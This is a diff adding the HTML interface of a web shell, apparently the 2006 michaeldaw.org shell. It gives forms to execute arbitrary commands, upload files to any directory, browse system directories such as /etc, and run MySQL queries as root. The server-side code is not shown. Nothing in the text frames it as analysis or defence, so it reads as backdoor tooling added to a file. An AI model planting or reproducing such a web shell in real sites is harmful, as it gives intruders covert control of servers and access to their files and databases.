@@ -1,0 +1,15 @@
+<pre><form action="" METHOD=GET >execute command: <input type="text" name="c"><input type="submit" value="go"><hr></form> 
+<form enctype="multipart/form-data" action="" method="post"><input type="hidden" name="MAX_FILE_SIZE" value="1000000000">
+upload file:<input name="file_name" type="file">   to dir: <input type="text" name="dir">&nbsp;&nbsp;<input type="submit" name="upload" value="upload"></form>
+<hr>to browse go to http://?d=[directory here]
+<br>for example:
+http://?d=/etc on *nix
+or http://?d=c:/windows on win
+<hr>execute mysql query:
+<form action="" METHOD=GET >
+host:<input type="text" name="host"value="localhost">  user: <input type="text" name="usr" value=root> password: <input type="text" name="passwd">
+
+database: <input type="text" name="db">  query: <input type="text" name="mquery"> <input type="submit" value="execute">
+</form>
+
+<!--	http://michaeldaw.org	2006 	-->
